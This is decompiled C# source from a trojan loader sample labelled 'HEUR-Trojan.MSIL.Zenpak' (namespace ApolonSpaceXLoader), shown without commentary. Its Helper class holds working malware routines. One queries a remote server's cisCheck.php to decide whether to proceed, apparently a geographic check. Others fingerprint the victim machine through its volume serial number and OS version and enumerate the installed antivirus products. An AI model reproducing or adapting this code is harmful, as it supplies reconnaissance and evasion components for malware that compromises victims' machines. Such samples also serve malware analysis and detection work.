// Decompiled with JetBrains decompiler
// Type: ApolonSpaceXLoader.Helper
// Assembly: Install, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9F00F6EC-4A12-457B-879D-3B57E6593C67
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zenpak.gen-251b0e105c9b6ccaa3cc0ceca46e682774252574958445114fbdc94b427a8c46.exe

using System;
using System.Management;
using System.Net;
using System.Security.Cryptography;

namespace ApolonSpaceXLoader
{
  internal class Helper
  {
    private static readonly char[] AvailableCharacters = new char[64]
    {
      'A',
      'B',
      'C',
      'D',
      'E',
      'F',
      'G',
      'H',
      'I',
      'J',
      'K',
      'L',
      'M',
      'N',
      'O',
      'P',
      'Q',
      'R',
      'S',
      'T',
      'U',
      'V',
      'W',
      'X',
      'Y',
      'Z',
      'a',
      'b',
      'c',
      'd',
      'e',
      'f',
      'g',
      'h',
      'i',
      'j',
      'k',
      'l',
      'm',
      'n',
      'o',
      'p',
      'q',
      'r',
      's',
      't',
      'u',
      'v',
      'w',
      'x',
      'y',
      'z',
      '0',
      '1',
      '2',
      '3',
      '4',
      '5',
      '6',
      '7',
      '8',
      '9',
      '-',
      '_'
    };

    public static bool Cis(string domain)
    {
      try
      {
        using (WebClient webClient = new WebClient())
          return webClient.DownloadString(domain + "/cisCheck.php") == "YES";
      }
      catch
      {
        return false;
      }
    }

    public static string HWID()
    {
      string empty = string.Empty;
      try
      {
        using (ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\""))
        {
          managementObject.Get();
          empty = managementObject["VolumeSerialNumber"]?.ToString();
        }
      }
      catch
      {
      }
      return empty;
    }

    public static string GetOSInformation()
    {
      foreach (ManagementObject managementObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
      {
        try
        {
          return (string) managementObject["Version"];
        }
        catch
        {
        }
      }
      return "BIOS Maker: Unknown";
    }

    public static string AV()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
      string str1 = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
      {
        string str2 = (string) managementBaseObject["displayName"];
        str1 = str1 + str2 + ", ";
      }
      return str1;
    }

    public static string RandomID(int length)
    {
      char[] chArray = new char[length];
      byte[] data = new byte[length];
      using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
        cryptoServiceProvider.GetBytes(data);
      for (int index = 0; index < chArray.Length; ++index)
        chArray[index] = Helper.AvailableCharacters[(int) data[index] % Helper.AvailableCharacters.Length];
      return new string(chArray);
    }
  }
}
